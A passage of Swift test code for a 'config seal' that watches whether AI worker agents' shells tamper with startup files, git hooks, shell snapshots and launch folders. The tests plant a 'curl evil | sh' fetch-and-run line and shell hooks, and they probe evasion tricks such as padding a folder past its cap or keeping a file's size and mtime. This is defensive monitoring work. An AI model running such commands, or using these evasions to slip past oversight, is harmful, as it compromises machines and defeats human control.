import Foundation
import Testing
@testable import VibeCore

/// The config seal's Linux list (`LinuxSealList`, the start plan's S7): what a worker's shell can change on the node
/// that the next session or the node itself runs. Every home here is a scratch one; the entries outside a home
/// (`/run/user/<uid>/systemd/…`, `/mnt/c/…`) are read under a scratch root (`outside:`), never the real ones.
struct LinuxSealListTests {
    let temp = Scratch()

    static let linux: ConditionTrait = .enabled(if: !Platform.CodeIdentity.isAvailable, "the Linux list; the Mac's is empty")

    /// A scratch home, made.
    func home() throws -> String {
        let url = temp.url("seal-home")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url.resolvingSymlinksInPath().path
    }

    func write(_ text: String, _ path: String) throws {
        try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
        try text.write(toFile: path, atomically: false, encoding: .utf8)
    }

    /// A stand-in mounts file: `/mnt/c` a 9p mount when `windows`.
    func mounts(windows: Bool) throws -> String {
        let path = temp.url("mounts").path
        var text = "none / ext4 rw,relatime 0 0\nnone /run/user tmpfs rw,nosuid,nodev 0 0\n"
        if windows { text += #"C:\134 /mnt/c 9p rw,dirsync,noatime,aname=drvfs;path=C:\;uid=1000;gid=1000 0 0"# + "\n" }
        try text.write(toFile: path, atomically: true, encoding: .utf8)
        return path
    }

    /// Every fingerprint of `items`, by name.
    func prints(_ items: [ConfigSeal.Watched]) -> [String: String] {
        Dictionary(items.map { ($0.name, ConfigSeal.fingerprint($0) ?? "nil") }) { first, _ in first }
    }

    /// Waits (bounded) until a file changed now gets a later ctime than `path`'s: Linux's ctime is as coarse as the
    /// kernel's tick, and a change in the tick of the last one would keep it. The probe is outside every watched thing
    /// (on the same filesystem), so only the write that follows changes what's watched.
    func waitForTheNextTick(after path: String) throws {
        var info = stat()
        guard lstat(path, &info) == 0 else { return }
        let last = Platform.Files.changed(info)
        let probe = temp.url("tick-probe-\(UUID().uuidString)").path
        defer { unlink(probe) }
        let deadline = Date().addingTimeInterval(10)
        while Date() < deadline {
            try write("t", probe)
            var now = stat()
            guard lstat(probe, &now) == 0 else { continue }
            let at = Platform.Files.changed(now)
            if at.tv_sec > last.tv_sec || (at.tv_sec == last.tv_sec && at.tv_nsec > last.tv_nsec) { return }
        }
        Issue.record("the change time never moved past \(path)'s")
    }

    /// A write that keeps a file's size and mtime: contents changed in place, then `touch -d` back.
    func rewriteKeepingSizeAndTime(_ path: String) throws {
        var info = stat()
        try #require(lstat(path, &info) == 0)
        let size = Int(info.st_size)
        let mtime = Platform.Files.modified(info)
        try waitForTheNextTick(after: path)
        let old = try Data(contentsOf: URL(fileURLWithPath: path))
        let new = Data(old.map { $0 == UInt8(ascii: "a") ? UInt8(ascii: "b") : UInt8(ascii: "a") })
        // In place: no truncation, no new inode.
        let handle = try #require(FileHandle(forWritingAtPath: path))
        handle.write(new)
        handle.closeFile()
        var times = [mtime, mtime]
        try #require(utimensat(AT_FDCWD, path, &times, 0) == 0)
        var after = stat()
        try #require(lstat(path, &after) == 0)
        #expect(Int(after.st_size) == size && Platform.Files.modified(after).tv_sec == mtime.tv_sec
                && Platform.Files.modified(after).tv_nsec == mtime.tv_nsec, "\(path) kept its size and mtime")
    }

    /// For every entry of the list, a write in a scratch home (or the scratch root outside it) changes that entry's
    /// fingerprint and no other's. A listing's write keeps size and mtime. Absent, each hashes as absent, and changes
    /// when created.
    @Test(Self.linux) func aWriteToEachItemOfTheLinuxListIsHeld() throws {
        let home = try home()
        let outside = temp.url("seal-outside").path
        let uid = getuid()
        // A user's Windows folders, so the `/mnt/c` entries are there to write.
        try FileManager.default.createDirectory(atPath: outside + "/mnt/c/Users/someone", withIntermediateDirectories: true)
        try write(". ~/x.sh\n", home + "/.bashrc")
        let mounts = try mounts(windows: true)
        let list = { LinuxSealList.watched(home: home, uid: uid, mounts: mounts, outside: outside) }
        let items = list()
        let names = Set(items.map(\.name))
        for (relative, _) in LinuxSealList.homeEntries { #expect(names.contains("~/" + relative), "\(relative) listed") }
        for name in ["~/x.sh", "/run/user/\(uid)/systemd/transient", "/run/user/\(uid)/systemd/user.control", "/run/user/\(uid)/systemd/user",
                     "/mnt/c/Users/someone/.wslconfig", "/mnt/c/Users/someone/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"] {
            #expect(names.contains(name), "\(name) listed: \(names.sorted())")
        }
        #expect(items.allSatisfy { $0.executes }, "every entry executes")
        #expect(items.allSatisfy { ConfigSeal.executes(key: ConfigSeal.keyPrefix + $0.name) })
        #expect(items.allSatisfy { ConfigSeal.isHome(key: ConfigSeal.keyPrefix + $0.name) }, "each is the node-wide seal's")
        // nvm's versions as one listing, so a new one is a change.
        #expect(!names.contains { $0.hasPrefix("~/.nvm/versions/node/") })

        let absent = ConfigSeal.fingerprint(ConfigSeal.Watched(name: "absent", path: home + "/nothing-here", kind: .file))
        var before = prints(items + ConfigSeal.homeWatched(home: home))
        for item in items where item.name != "~/.bashrc" {
            let printed = try #require(before[item.name])
            #expect(printed == absent, "\(item.name) hashes as absent")
        }
        for item in items {
            switch item.kind {
            case .file: try write("planted \(item.name)\n", item.path)
            case .folder, .entries: try write("planted\n", item.path + "/planted")
            case .listing:
                // Created, then (seen as created) rewritten in place keeping its size and mtime.
                try write("aaaa\n", item.path + "/tool")
                let created = prints(items)
                #expect(created[item.name] != before[item.name], "\(item.name) changed when created")
                before[item.name] = created[item.name]
                try rewriteKeepingSizeAndTime(item.path + "/tool")
            default: Issue.record("\(item.name): a kind the list doesn't use")
            }
            let after = prints(list() + ConfigSeal.homeWatched(home: home))
            for (name, printed) in before where name != item.name {
                #expect(after[name] == printed, "a write to \(item.name) changed \(name)")
            }
            #expect(after[item.name] != before[item.name], "a write to \(item.name) held nothing")
            before = after
        }
    }

    /// nvm's node versions are one listing and its alias another: a new version, or the default alias pointed at it, is
    /// a change (every new shell's `nvm.sh` uses `alias/default`'s node).
    @Test(Self.linux) func aNewNodeVersionOrTheDefaultAliasIsAChange() throws {
        let home = try home()
        let mounts = try mounts(windows: false)
        try write("aaaa\n", home + "/.nvm/versions/node/v22.16.0/bin/node")
        try write("v22.16.0\n", home + "/.nvm/alias/default")
        let list = LinuxSealList.watched(home: home, uid: getuid(), mounts: mounts)
        let versions = try #require(list.first { $0.name == "~/.nvm/versions/node" })
        let alias = try #require(list.first { $0.name == "~/.nvm/alias" })
        #expect(versions.kind == .listing && alias.kind == .listing)
        #expect(!list.contains { $0.name.hasPrefix("~/.nvm/versions/node/") })
        let was = prints([versions, alias])
        try write("bbbb\n", home + "/.nvm/versions/node/v22.16.1/bin/node")
        let added = prints([versions, alias])
        #expect(added[versions.name] != was[versions.name], "a new version")
        #expect(added[alias.name] == was[alias.name])
        try rewriteKeepingSizeAndTime(home + "/.nvm/alias/default")
        let pointed = prints([versions, alias])
        #expect(pointed[alias.name] != added[alias.name], "the default alias rewritten")
        #expect(pointed[versions.name] == added[versions.name])
    }

    /// What the startup files source, written `~/…`, `$HOME/…`, `${HOME}/…` or by the home's own path: each a file.
    @Test(Self.linux) func aSourcedFileIsWatched() throws {
        let home = try home()
        let text = """
            . ~/x.sh
            if true; then
                source "$HOME/y.sh"
            fi
            [ -f ${HOME}/z ] && source ${HOME}/z
            . '\(home)/w.sh'
            # . ~/commented.sh
            . /usr/share/bash-completion/bash_completion
            [ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh"

            """
        #expect(LinuxSealList.sourced(startupFile: text, home: home) == [home + "/x.sh", home + "/y.sh", home + "/z", home + "/w.sh"])
        try write(text, home + "/.profile")
        let mounts = try mounts(windows: false)
        let list = { LinuxSealList.watched(home: home, uid: getuid(), mounts: mounts) }
        for name in ["~/x.sh", "~/y.sh", "~/z", "~/w.sh"] {
            let item = try #require(list().first { $0.name == name }, "\(name)")
            #expect(item.kind == .file && item.executes)
            let before = ConfigSeal.fingerprint(item)
            try write("planted\n", item.path)
            #expect(ConfigSeal.fingerprint(item) != before, "a write to \(name) held nothing")
        }
        // Listed once, beside the static entries.
        #expect(Set(list().map(\.name)).count == list().count)
    }

    /// On the Mac the list is empty, and `homeWatched` is today's.
    @Test(.enabled(if: Platform.CodeIdentity.isAvailable, "the Mac's")) func theMacsListIsEmpty() throws {
        let home = try home()
        try write(". ~/x.sh\n", home + "/.bashrc")
        #expect(LinuxSealList.watched(home: home, uid: getuid()).isEmpty)
        let names = ConfigSeal.homeWatched(home: home).map(\.name)
        #expect(names == ConfigSeal.homeFiles.map { "~/" + $0.0 } + ["~/.claude/settings.json's scripts", "~/.claude/settings.local.json's scripts"])
    }

    /// A listing reads metadata only: a file it can't read still fingerprints, and its mode is part of it.
    @Test(Self.linux) func aListingNeverReadsContents() throws {
        let folder = temp.url("listing").path
        try write("secret\n", folder + "/hosts.yml")
        chmod(folder + "/hosts.yml", 0)
        let item = ConfigSeal.Watched(name: "~/.config/gh", path: folder, kind: .listing)
        let printed = try #require(ConfigSeal.fingerprint(item))
        #expect(ConfigSeal.fingerprint(item) == printed)
        try waitForTheNextTick(after: folder + "/hosts.yml")
        chmod(folder + "/hosts.yml", 0o600)
        #expect(ConfigSeal.fingerprint(item) != printed)
    }

    /// A listing has no cap: one of 25,000 entries changes its fingerprint when its last entry changes.
    @Test(Self.linux) func aListingIsNotCut() throws {
        let folder = temp.url("listing").path
        try FileManager.default.createDirectory(atPath: folder, withIntermediateDirectories: true)
        for index in 0..<25_000 {
            let fd = open(folder + String(format: "/e%05d", index), O_WRONLY | O_CREAT | O_EXCL, 0o644)
            try #require(fd >= 0)
            close(fd)
        }
        let item = ConfigSeal.Watched(name: "~/.local/share/claude/versions", path: folder, kind: .listing)
        let printed = try #require(ConfigSeal.fingerprint(item))
        try write("x", folder + "/e24999")
        #expect(ConfigSeal.fingerprint(item) != printed)
    }

    /// The Windows files only while `/mnt/c` is a 9p or drvfs mount, for each user but Public, Default and All Users.
    @Test(Self.linux) func theWindowsFilesAreWatchedOnlyWhileMounted() throws {
        let home = try home()
        let outside = temp.url("seal-outside").path
        for user in ["someone", "Public", "Default", "All Users", "another"] {
            try FileManager.default.createDirectory(atPath: outside + "/mnt/c/Users/" + user, withIntermediateDirectories: true)
        }
        try write("[.ShellClassInfo]\n", outside + "/mnt/c/Users/desktop.ini")
        let windows = { (mounted: Bool) throws -> [String] in
            LinuxSealList.watched(home: home, uid: getuid(), mounts: try mounts(windows: mounted), outside: outside)
                .map(\.name).filter { $0.hasPrefix("/mnt/") }.sorted()
        }
        let startup = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
        #expect(try windows(true) == ["/mnt/c/Users/another/.wslconfig", "/mnt/c/Users/another" + startup,
                                      "/mnt/c/Users/someone/.wslconfig", "/mnt/c/Users/someone" + startup])
        #expect(try windows(false) == [])
        // A drvfs mount counts as well.
        let drvfs = temp.url("mounts").path
        try "C: /mnt/c drvfs rw,noatime 0 0\n".write(toFile: drvfs, atomically: true, encoding: .utf8)
        #expect(LinuxSealList.watched(home: home, uid: getuid(), mounts: drvfs, outside: outside).contains { $0.name.hasPrefix("/mnt/c/") })
    }

    /// A scratch home's list reads nothing outside it: only the account's own home takes the `/run/user` and `/mnt/c`
    /// entries (so no test's seal reads the user's runtime folder or Windows).
    @Test(Self.linux) func aScratchHomeReadsNothingOutsideIt() throws {
        let home = try home()
        let names = LinuxSealList.watched(home: home, uid: getuid(), mounts: try mounts(windows: true)).map(\.name)
        #expect(!names.contains { $0.hasPrefix("/") }, "\(names)")
        #expect(ConfigSeal.homeWatched(home: home).allSatisfy { !$0.path.hasPrefix("/run/") && !$0.path.hasPrefix("/mnt/") })
    }

    /// ST-D19: in a folder of `.entries`, an entry added or removed is no change; one changed in place is, and so is a
    /// removed one that comes back changed.
    @Test(Self.linux) func anEntriesFolderCountsOnlyEntriesChangedInPlace() throws {
        let home = try home()
        let snapshots = home + "/.claude/shell-snapshots"
        try write("one\n", snapshots + "/snapshot-bash-1-a.sh")
        let item = try #require(LinuxSealList.watched(home: home, uid: getuid()).first { $0.name == "~/.claude/shell-snapshots" })
        #expect(item.kind == .entries)
        let key = ConfigSeal.keyPrefix + item.name
        var recorded = ConfigSeal.hashes(of: [item])
        func look() -> String? {
            let now = ConfigSeal.hashes(of: [item])
            guard let kept = LinuxSealList.cameOrWent(key: key, recorded: recorded, now: now) else { return nil }
            recorded[key] = now[key]
            recorded[ConfigSeal.keysKey(of: key)] = kept
            return kept
        }
        try write("two\n", snapshots + "/snapshot-bash-2-b.sh")
        #expect(look() != nil, "an entry added")
        try FileManager.default.removeItem(atPath: snapshots + "/snapshot-bash-1-a.sh")
        #expect(look() != nil, "an entry removed")
        try write("planted\n", snapshots + "/snapshot-bash-2-b.sh")
        #expect(look() == nil, "an entry changed in place")
        recorded = ConfigSeal.hashes(of: [item])
        try FileManager.default.removeItem(atPath: snapshots + "/snapshot-bash-2-b.sh")
        #expect(look() != nil)
        try write("planted again\n", snapshots + "/snapshot-bash-2-b.sh")
        #expect(look() == nil, "a removed entry back changed")
        // A read cut at the walk's cap: entries past it are unseen, so it's judged as ever (held). Its hash is its own
        // (folders' lines carry their mode, unlike the plain folder read's), and the same at each read.
        recorded = ConfigSeal.hashes(of: [item])
        try Self.pad(snapshots, ConfigSeal.maxEntries + 1)
        let cut = ConfigSeal.hashes(of: [item])
        #expect(ConfigSeal.decode(cut[ConfigSeal.keysKey(of: key)] ?? "")[LinuxSealList.cutEntry] != nil)
        #expect(cut[key] == ConfigSeal.hashes(of: [item])[key])
        #expect(look() == nil, "padded past the cap")
        // Not a folder of entries: judged as ever.
        let bin = ConfigSeal.Watched(name: "~/bin", path: home + "/bin", kind: .folder)
        let binKey = ConfigSeal.keyPrefix + bin.name
        let was = ConfigSeal.hashes(of: [bin])
        try write("x\n", home + "/bin/x")
        #expect(LinuxSealList.cameOrWent(key: binKey, recorded: was, now: ConfigSeal.hashes(of: [bin])) == nil)
    }

    /// In the launch folders, only a launch the vault recorded comes: its repository's folder, its own, and the files a
    /// launcher writes there (or `writePrivate`'s temporary one); a name no launch has, another repository's key, a
    /// file the launcher doesn't write, a link, or anything deeper doesn't. The names are the launchers', from the
    /// vault's members and former members.
    @Test func aLaunchFolderComesOnlyAsARecordedLaunch() throws {
        let key = String(repeating: "a", count: 20)
        let launches: Set<String> = [key + "/worker-fix", key + "/lead-repo"]
        let may = { (path: String, kind: String) in LinuxSealList.launchEntryMayCome(path, entry: "0123abcd \(kind) 0", launches: launches) }
        #expect(may(key, "d") && may(key + "/worker-fix", "d") && may(key + "/lead-repo", "d"))
        for file in ["prompt.md", "mcp.json", "settings.json", "codex-config.json", ".settings.json.\(UUID().uuidString)"] {
            #expect(may(key + "/worker-fix/" + file, "f"), "\(file)")
        }
        #expect(!may(key + "/worker-other", "d"), "a launch no launch made")
        #expect(!may(key + "/worker-fix/hooks.sh", "f"), "a file the launcher doesn't write")
        #expect(!may(key + "/worker-fix/settings.json", "l"), "a link")
        #expect(!may(key + "/worker-fix/settings.json/x", "f"), "deeper")
        #expect(!may(key + "/worker-fix", "f") && !may(key, "l"), "not a folder")
        #expect(!may(String(repeating: "b", count: 20), "d") && !may(String(repeating: "b", count: 20) + "/worker-fix", "d"), "another key")
        #expect(!may(key + "/worker-fix/.settings.json.x", "f") && !may(key + "/./worker-fix", "d"))

        let issued = 0.0, lead = LeadVault.Caller.app
        let member = { (role: LeadLaunch.Role, task: String?, finder: Int?) in
            LeadVault.Member(id: UUID().uuidString, role: role, task: task, session: nil, auditing: nil,
                             finder: finder.map { LeadVault.Finder(panel: "p", index: $0, size: 3, focus: "", nitCap: 0) }, issuedAt: issued, issuer: lead)
        }
        var team = LeadVault.Book.Team(root: "/somewhere/My Repo")
        team.members = [member(.lead, nil, nil), member(.worker, "fix", nil), member(.verifier, "fix", 1), member(.verifier, "fix", 2)]
        team.formerRoles = ["s1": LeadVault.Former(role: .verifier, task: "old"), "s2": LeadVault.Former(role: .worker, task: "gone")]
        #expect(LinuxSealList.launches([key: team]) == Set([
            "lead-my-repo", "worker-fix", "verify-fix", "finder2-fix", "verify-old", "finder2-old", "finder3-old", "worker-gone",
        ].map { key + "/" + $0 }))
        // Only where the hashes hold the launch folders' (never on the Mac), and never as sent.
        let run = ConfigSeal.keyPrefix + LinuxSealList.runName
        #expect(LinuxSealList.withLaunches([LinuxSealList.launchesKey: key + "/planted"], teams: [key: team]) == [:])
        #expect(LinuxSealList.withLaunches([run: "h", LinuxSealList.launchesKey: key + "/planted"], teams: [:]) == [run: "h", LinuxSealList.launchesKey: ""])
    }

    /// `count` empty files in `folder`, named to sort before everything else there.
    static func pad(_ folder: String, _ count: Int) throws {
        try FileManager.default.createDirectory(atPath: folder, withIntermediateDirectories: true)
        for index in 0..<count {
            let fd = open(folder + String(format: "/0pad%06d", index), O_WRONLY | O_CREAT | O_EXCL, 0o644)
            try #require(fd >= 0)
            close(fd)
        }
    }

    /// The lead's accepted hooks (`~/.vibeswitcher/lead/git-hooks`, `.entries`): a fresh repository's baseline, as
    /// GitGuard writes it (shims, copies, record), is entries added, and its record's `told` flag set by the lead's tool
    /// server is no change. A hook added to a copy, a new repository's folder holding anything but a baseline, a copy
    /// changed, or a record changed otherwise (also by a key given twice, as GitGuard's decoder reads it) is.
    @Test(Self.linux) func theHooksRecordsToldFlagIsNoChange() throws {
        let home = try home()
        let hooks = home + "/.vibeswitcher/lead/git-hooks"
        let item = try #require(LinuxSealList.watched(home: home, uid: getuid()).first { $0.name == "~/.vibeswitcher/lead/git-hooks" })
        #expect(item.kind == .entries)
        let key = ConfigSeal.keyPrefix + item.name
        let empty = ConfigSeal.hashes(of: [item])
        // Held: changed, and not as entries come and gone.
        let held = { (recorded: [String: String]) -> Bool in
            let now = ConfigSeal.hashes(of: [item])
            return now[key] != recorded[key] && LinuxSealList.cameOrWent(key: key, recorded: recorded, now: now) == nil
        }
        try Self.baseline(in: hooks, store: "0123456789abcdef", hooks: ["pre-commit"])
        let baseline = ConfigSeal.hashes(of: [item])
        #expect(LinuxSealList.cameOrWent(key: key, recorded: empty, now: baseline) != nil, "the baseline: entries added")
        try Self.record(in: hooks + "/0123456789abcdef", told: true, run: ["pre-commit"])
        #expect(!held(baseline), "told set")
        try Self.record(in: hooks + "/0123456789abcdef", told: true, run: [])
        #expect(held(baseline), "the record changed")
        // A key given twice: GitGuard's decoder takes the first, so that's the record's.
        try Self.record(in: hooks + "/0123456789abcdef", told: nil, run: ["pre-commit"], prefix: "\"run\":[],")
        #expect(held(baseline), "a key given twice")
        try Self.record(in: hooks + "/0123456789abcdef", told: nil, run: ["pre-commit"])
        #expect(!held(baseline))
        // A hook added to the copy git takes its hooks from runs as the lead: held, shim or not.
        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/0123456789abcdef/copy/hooks/post-merge", mode: 0o700)
        #expect(held(baseline), "a hook added to an accepted copy")
        try FileManager.default.removeItem(atPath: hooks + "/0123456789abcdef/copy/hooks/post-merge")
        try installScript(GitGuard.shim(running: "/elsewhere"), atPath: hooks + "/0123456789abcdef/copy/hooks/post-merge", mode: 0o700)
        #expect(held(baseline), "a shim added to an accepted copy")
        try FileManager.default.removeItem(atPath: hooks + "/0123456789abcdef/copy/hooks/post-merge")
        #expect(!held(baseline))
        // A shim changed in place.
        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/0123456789abcdef/copy/hooks/pre-commit", mode: 0o700)
        #expect(held(baseline), "the copy changed")
        try FileManager.default.removeItem(atPath: hooks + "/0123456789abcdef")
        try Self.baseline(in: hooks, store: "0123456789abcdef", hooks: ["pre-commit"])
        #expect(!held(baseline))
        // A new repository's folder: its baseline comes; one with a hook that isn't a shim, a link for its copy or its
        // hooks folder, or anything else, doesn't.
        try Self.baseline(in: hooks, store: "fedcba9876543210", hooks: ["pre-commit", "post-merge"])
        #expect(!held(baseline), "a second repository's baseline")
        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/fedcba9876543210/copy/hooks/reference-transaction", mode: 0o700)
        #expect(held(baseline), "a new repository's folder with a hook that isn't a shim")
        try FileManager.default.removeItem(atPath: hooks + "/fedcba9876543210")
        try FileManager.default.createDirectory(atPath: hooks + "/fedcba9876543210", withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: hooks + "/fedcba9876543210/copy", withDestinationPath: temp.url("planted").path)
        #expect(held(baseline), "a new repository's copy a link")
        try FileManager.default.removeItem(atPath: hooks + "/fedcba9876543210")
        try FileManager.default.createDirectory(atPath: hooks + "/fedcba9876543210/copy", withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: hooks + "/fedcba9876543210/copy/hooks", withDestinationPath: temp.url("planted").path)
        #expect(held(baseline), "a new repository's hooks folder a link")
        try FileManager.default.removeItem(atPath: hooks + "/fedcba9876543210")
        try write("x\n", hooks + "/fedcba9876543210/other")
        #expect(held(baseline), "a new repository's folder with anything else")
    }

    /// A repository's accepted hooks as `GitGuard.accept` writes its baseline under `hooks/store`: for each hook, its copy
    /// in `run` and its shim in `hooks` (running that copy under `VibePaths.root`, as GitGuard names it), then the record.
    static func baseline(in hooks: String, store: String, hooks names: [String]) throws {
        let folder = hooks + "/" + store
        try FileManager.default.createDirectory(atPath: folder + "/copy/hooks", withIntermediateDirectories: true)
        try FileManager.default.createDirectory(atPath: folder + "/copy/run", withIntermediateDirectories: true)
        for name in names {
            try installScript("#!/bin/sh\nexit 0\n", atPath: folder + "/copy/run/" + name, mode: 0o700)
            let runs = VibePaths.root.appendingPathComponent("lead/git-hooks/\(store)/copy/run/\(name)").path
            try installScript(GitGuard.shim(running: runs), atPath: folder + "/copy/hooks/" + name, mode: 0o700)
        }
        try Self.record(in: folder, told: nil, run: names)
    }

    /// The record at `folder/accepted.json`, as GitGuard encodes it, with `prefix` (members) put first.
    static func record(in folder: String, told: Bool?, run: [String], prefix: String = "") throws {
        let record = GitGuard.Accepted(folder: "/repo/.git/hooks", files: run.map { GitGuard.HookFile(name: $0, sha256: String(repeating: "0", count: 64), executable: true) },
                                       run: run, baseline: true, told: told)
        let text = String(decoding: try JSONEncoder().encode(record), as: UTF8.self)
        try ("{" + prefix + text.dropFirst()).write(toFile: folder + "/accepted.json", atomically: false, encoding: .utf8)
    }

    /// Gated: one look at the list of the account's real home, read only and leaving out `~/.claude`,
    /// `~/.vibeswitcher` and `/run/user`, timed for the inventory. Enabled only with `VIBESWITCHER_SEAL_TIMING_HOME` set to the home
    /// the user database gives on the run's command line.
    @Test(.enabled(if: ProcessInfo.processInfo.environment["VIBESWITCHER_SEAL_TIMING_HOME"] != nil, "times a look at the real home's list"))
    func aLookOfTheLinuxListIsTimed() throws {
        let given = try #require(ProcessInfo.processInfo.environment["VIBESWITCHER_SEAL_TIMING_HOME"])
        let account = try #require(getpwuid(getuid()).map { String(cString: $0.pointee.pw_dir) })
        try #require(given == account, "VIBESWITCHER_SEAL_TIMING_HOME must be the user database's home, \(account)")
        // Never the user's runtime folder (`$XDG_RUNTIME_DIR`'s systemd folders): the plan's Global Constraints.
        let items = LinuxSealList.watched(home: account, uid: getuid()).filter { item in
            !["/.claude", "/.vibeswitcher"].contains { item.path == account + $0 || item.path.hasPrefix(account + $0 + "/") }
                && !item.name.hasPrefix("/run/user/")
        }
        let start = Date()
        let hashes = ConfigSeal.hashes(of: items)
        let seconds = Date().timeIntervalSince(start)
        print("seal timing: \(items.count) entries, \(hashes.filter { ConfigSeal.isWatchedKey($0.key) }.count) hashed, "
              + String(format: "%.2f s", seconds))
        for item in items { print("seal timing entry: \(item.name) (\(item.kind))") }
        #expect(hashes.filter { ConfigSeal.isWatchedKey($0.key) }.count == items.count)
    }
}

/// The seal's Linux list through the vault's own looks (`LeadVault.checkConfig`, the lead's and the app's), in the
/// fixture vault's scratch home (`book.configHome`).
struct LinuxSealVaultTests: LeadTeamFixture {
    let temp = Scratch()
    let vault: LeadVault
    init() { vault = Self.newVault(in: temp) }

    var home: String { book.configHome }

    func repo() throws -> String {
        let url = temp.url("lead")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        let root = url.resolvingSymlinksInPath().path
        for args in [["init", "-q", "-b", "main"], ["config", "user.email", "t@t"], ["config", "user.name", "T"]] { Git.run(args, in: root) }
        try "one\n".write(toFile: root + "/a.txt", atomically: true, encoding: .utf8)
        Git.run(["add", "a.txt"], in: root)
        Git.run(["commit", "-q", "-m", "first"], in: root)
        try FileManager.default.createDirectory(atPath: root + "/.vibeswitcher", withIntermediateDirectories: true)
        try "---\nmax_workers: 3\n---\n".write(toFile: root + "/.vibeswitcher/workflow.md", atomically: true, encoding: .utf8)
        return root
    }

    func write(_ text: String, _ path: String) throws {
        try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
        try text.write(toFile: path, atomically: true, encoding: .utf8)
    }

    /// A team whose lead runs, its seal recorded by the app's look as the scratch home is now.
    func team() throws -> (root: String, lead: LeadVault) {
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        _ = try vault.checkConfig(root: root)
        #expect(try vault(for: runtime).checkConfig(root: root) == LeadVault.ConfigCheck())
        return (root, vault(for: runtime))
    }

    /// A worker that deletes the lead's shell snapshot, waits for a look, and writes it back changed is held: the
    /// removed entry is kept through the whole look, not only until it seals.
    @Test(LinuxSealListTests.linux) func aSnapshotRemovedAndBackChangedIsHeld() throws {
        let snapshot = home + "/.claude/shell-snapshots/snapshot-bash-1-a.sh"
        try write("export A=1\n", snapshot)
        let (root, lead) = try team()
        try write("export B=2\n", home + "/.claude/shell-snapshots/snapshot-bash-2-b.sh")
        #expect(try lead.checkConfig(root: root).held.isEmpty, "an entry added")
        try FileManager.default.removeItem(atPath: snapshot)
        #expect(try lead.checkConfig(root: root).held.isEmpty, "an entry removed")
        try write("curl evil | sh\n", snapshot)
        #expect(try lead.checkConfig(root: root).held == ["~/.claude/shell-snapshots"], "back changed")
    }

    /// Entries added past the walk's cap would hide the ones after it: held, and a change in place after it too.
    @Test(LinuxSealListTests.linux) func aSnapshotsFolderPaddedPastItsCapIsHeld() throws {
        let folder = home + "/.claude/shell-snapshots"
        try write("export A=1\n", folder + "/snapshot-bash-1-a.sh")
        let (root, lead) = try team()
        try LinuxSealListTests.pad(folder, ConfigSeal.maxEntries + 1)
        #expect(try lead.checkConfig(root: root).held == ["~/.claude/shell-snapshots"], "padded")
        try write("curl evil | sh\n", folder + "/snapshot-bash-1-a.sh")
        #expect(try lead.checkConfig(root: root).held == ["~/.claude/shell-snapshots"], "then changed in place")
    }

    /// A repository's baseline (GitGuard's) comes as no change, and so does its told flag; a hook added to its copy, or
    /// a new repository's folder whose hook isn't a shim, is held.
    @Test(LinuxSealListTests.linux) func aHookAddedToTheAcceptedHooksIsHeld() throws {
        let hooks = home + "/.vibeswitcher/lead/git-hooks"
        let (root, lead) = try team()
        let helper = LinuxSealListTests.self
        try helper.baseline(in: hooks, store: "0123456789abcdef", hooks: ["pre-commit"])
        #expect(try lead.checkConfig(root: root).held.isEmpty, "the baseline")
        try helper.record(in: hooks + "/0123456789abcdef", told: true, run: ["pre-commit"])
        #expect(try lead.checkConfig(root: root).held.isEmpty, "told set")
        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/0123456789abcdef/copy/hooks/reference-transaction", mode: 0o700)
        #expect(try lead.checkConfig(root: root).held == ["~/.vibeswitcher/lead/git-hooks"], "a hook added")
        // The app's accept seals it; a new repository's folder with a hook that isn't a shim is held anew.
        #expect(try vault.checkConfig(root: root).resealed == ["~/.vibeswitcher/lead/git-hooks"])
        try FileManager.default.createDirectory(atPath: hooks + "/fedcba9876543210/copy/hooks", withIntermediateDirectories: true)
        try installScript("#!/bin/sh\necho planted\n", atPath: hooks + "/fedcba9876543210/copy/hooks/post-merge", mode: 0o700)
        #expect(try lead.checkConfig(root: root).held == ["~/.vibeswitcher/lead/git-hooks"], "a planted repository")
    }

    /// The roles' launch folders (`~/.vibeswitcher/lead/run`, `.entries`): a launch the vault recorded (the lead's, a
    /// worker it issued a grant to) comes as entries added; a launch folder no launch made, a file the launcher doesn't
    /// write in a recorded one, or one under another repository's key is held.
    @Test(LinuxSealListTests.linux) func aLaunchEntryNoLaunchMadeHoldsTheTeam() throws {
        let run = home + "/.vibeswitcher/lead/run"
        let (root, lead) = try team()
        let key = LeadVault.key(root)
        let leadName = "lead-" + Slug.make(LeadMail.project(of: root), taken: [])
        try write("the lead's prompt\n", "\(run)/\(key)/\(leadName)/prompt.md")
        #expect(try lead.checkConfig(root: root).held.isEmpty, "the lead's own launch")
        _ = try lead.issue(role: .worker, root: root, task: "fix")
        try write("prompt\n", "\(run)/\(key)/worker-fix/prompt.md")
        try write("{}\n", "\(run)/\(key)/worker-fix/settings.json")
        #expect(try lead.checkConfig(root: root).held.isEmpty, "a worker the lead started")
        for (planted, what) in [("\(key)/worker-planted/settings.json", "a launch no launch made"),
                                ("\(key)/worker-fix/hooks.sh", "a file the launcher doesn't write"),
                                ("\(String(repeating: "0", count: 20))/worker-fix/settings.json", "another repository's key")] {
            try write("{\"hooks\": {}}\n", run + "/" + planted)
            #expect(try lead.checkConfig(root: root).held == ["~/.vibeswitcher/lead/run"], "\(what)")
            #expect(try vault.checkConfig(root: root).resealed == ["~/.vibeswitcher/lead/run"], "the app's accept")
        }
    }

    /// A watched folder made unreadable mid-walk (`chmod 000`) hides what's under it: held, as a cut read is, not
    /// taken as its entries gone.
    @Test(LinuxSealListTests.linux) func aWatchedSubfolderMadeUnreadableHoldsTheTeam() throws {
        let hooks = home + "/.vibeswitcher/lead/git-hooks"
        try LinuxSealListTests.baseline(in: hooks, store: "0123456789abcdef", hooks: ["pre-commit"])
        let copy = hooks + "/0123456789abcdef/copy"
